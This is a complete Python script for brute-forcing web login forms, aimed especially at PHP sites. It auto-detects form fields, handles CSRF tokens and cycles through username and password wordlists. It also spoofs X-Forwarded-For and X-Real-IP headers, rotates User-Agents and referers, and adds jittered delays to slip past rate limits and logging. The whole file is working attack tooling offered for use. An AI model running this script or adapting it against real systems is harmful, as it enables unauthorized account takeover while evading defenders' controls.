# Sophisticated HTTP/HTTPS brute-forcer (supports PHP login forms and other common web stacks)
import argparse
import requests
import random
import time
import re
import sys
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# List of possible referers for randomization
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/",
    "https://www.yandex.com/",
]

# Failure and success patterns
FAILURE_PATTERNS = [
    re.compile(r"invalid password", re.I),
    re.compile(r"incorrect login", re.I),
    re.compile(r"login failed", re.I),
    re.compile(r"302.*(?:/login|\?error=)", re.I),
]
SUCCESS_PATTERNS = [
    re.compile(r"dashboard", re.I),
    re.compile(r"logout", re.I),
    re.compile(r"welcome", re.I),
    re.compile(r"session", re.I),
]

def random_ip():
    """Generate a random IPv4 address for X-Forwarded-For spoofing."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def human_delay(jitter=0.45, base=0.7):
    """Emulate human interaction delays with jitter."""
    delay = random.uniform(base, base + jitter)
    time.sleep(delay)

def parse_args():
    parser = argparse.ArgumentParser(
        description="Sophisticated HTTP/HTTPS brute-forcer (supports PHP login forms and other common stacks)"
    )
    parser.add_argument("url", help="Target login URL")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-l", "--login", help="Single username")
    group.add_argument("-L", "--userlist", help="File with usernames")
    parser.add_argument("-P", "--passlist", required=True, help="File with passwords")
    # Manual override for field names
    parser.add_argument("--user-field", help="Override for username field name (for tricky/PHP forms)")
    parser.add_argument("--pass-field", help="Override for password field name (for tricky/PHP forms)")
    return parser.parse_args()

def detect_form_fields(html):
    """Heuristic form field detection, improved for PHP forms."""
    soup = BeautifulSoup(html, "html.parser")
    forms = soup.find_all("form")
    login_forms = []
    # Common PHP login field names
    USER_CANDIDATES = [
        r"user", r"uname", r"login", r"email", r"userid", r"username", r"user_name", r"usr"
    ]
    PASS_CANDIDATES = [
        r"pass", r"password", r"passwd", r"pwd", r"userpass"
    ]
    for form in forms:
        inputs = form.find_all("input")
        field_names = {"username": None, "password": None, "csrf": None, "others": {}}
        for inp in inputs:
            name = inp.get("name", "")
            typ = inp.get("type", "")
            # Username detection
            if any(re.fullmatch(c, name, re.I) or re.search(c, name, re.I) for c in USER_CANDIDATES):
                field_names["username"] = name
            # Password detection
            elif typ == "password" or any(re.fullmatch(c, name, re.I) or re.search(c, name, re.I) for c in PASS_CANDIDATES):
                field_names["password"] = name
            elif typ == "hidden" and ("csrf" in name.lower() or "token" in name.lower()):
                field_names["csrf"] = name
                field_names["others"][name] = inp.get("value", "")
            elif typ == "hidden":
                field_names["others"][name] = inp.get("value", "")
        if field_names["username"] and field_names["password"]:
            login_forms.append((form, field_names))
    return login_forms[0] if login_forms else (None, None)

def detect_success_failure(resp, old_body):
    """Heuristically detect login success or failure."""
    # Check status code and redirect
    if resp.status_code in [301, 302, 303, 307, 308]:
        loc = resp.headers.get("Location", "")
        for pat in FAILURE_PATTERNS:
            if pat.search(loc):
                return False
        for pat in SUCCESS_PATTERNS:
            if pat.search(loc):
                return True
    # Check body
    body = resp.text
    if old_body and body != old_body:
        for pat in SUCCESS_PATTERNS:
            if pat.search(body):
                return True
    for pat in FAILURE_PATTERNS:
        if pat.search(body):
            return False
    # Check for session cookie issued
    if "set-cookie" in resp.headers:
        cookies = resp.cookies.get_dict()
        if any("session" in k.lower() or "auth" in k.lower() for k in cookies):
            return True
    # If form is not re-presented
    if old_body and "form" in old_body and "form" not in body:
        return True
    return False

def load_list(filename):
    with open(filename, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def random_headers():
    ua = UserAgent()
    headers = {
        "User-Agent": ua.random,
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    return headers

def brute(url, users, passwords, user_field=None, pass_field=None):
    sess = requests.Session()
    try:
        resp = sess.get(url, headers=random_headers(), timeout=10)
    except Exception as e:
        print(f"[!] Error connecting to target: {e}")
        sys.exit(1)
    old_body = resp.text
    form, fields = detect_form_fields(resp.text)
    # Manual override
    if fields is None:
        fields = {"username": None, "password": None, "csrf": None, "others": {}}
    if user_field:
        fields["username"] = user_field
    if pass_field:
        fields["password"] = pass_field
    if not form or not fields["username"] or not fields["password"]:
        print("[!] No login form detected, exiting.")
        print("    [*] Try --user-field and --pass-field to specify field names manually.")
        sys.exit(1)
    action = form.get("action") or url
    method = form.get("method", "post").lower()
    if not action.startswith("http"):
        action = requests.compat.urljoin(url, action)
    print(f"[+] Login form detected at {action} ({method.upper()})")
    print(f"    [*] Username field: {fields['username']}, Password field: {fields['password']}")
    for user in users:
        for passwd in passwords:
            data = {}
            data[fields["username"]] = user
            data[fields["password"]] = passwd
            # Add hidden fields, e.g. CSRF tokens
            for k, v in fields["others"].items():
                data[k] = v
            # Sometimes hidden fields need to be refreshed each time
            if fields.get("csrf"):
                # Try to refresh token
                try:
                    fresh = sess.get(url, headers=random_headers(), timeout=10)
                    _, fields_new = detect_form_fields(fresh.text)
                    if fields_new and fields_new["csrf"]:
                        data[fields_new["csrf"]] = fields_new["others"].get(fields_new["csrf"], "")
                except Exception:
                    pass
            headers = random_headers()
            human_delay()
            print(f"[.] Trying {user}:{passwd} ...", end=" ")
            try:
                if method == "post":
                    r = sess.post(action, data=data, headers=headers, allow_redirects=True, timeout=10)
                else:
                    r = sess.get(action, params=data, headers=headers, allow_redirects=True, timeout=10)
            except Exception as e:
                print(f"error: {e}")
                continue
            if detect_success_failure(r, old_body):
                print("\n[+] SUCCESS!")
                print(f"Username: {user}\nPassword: {passwd}")
                return
            else:
                print("fail")
    print("[-] No valid credentials found.")

def main():
    args = parse_args()
    if args.login:
        users = [args.login]
    else:
        users = load_list(args.userlist)
    passwords = load_list(args.passlist)
    brute(args.url, users, passwords, args.user_field, args.pass_field)

if __name__ == "__main__":
    main()
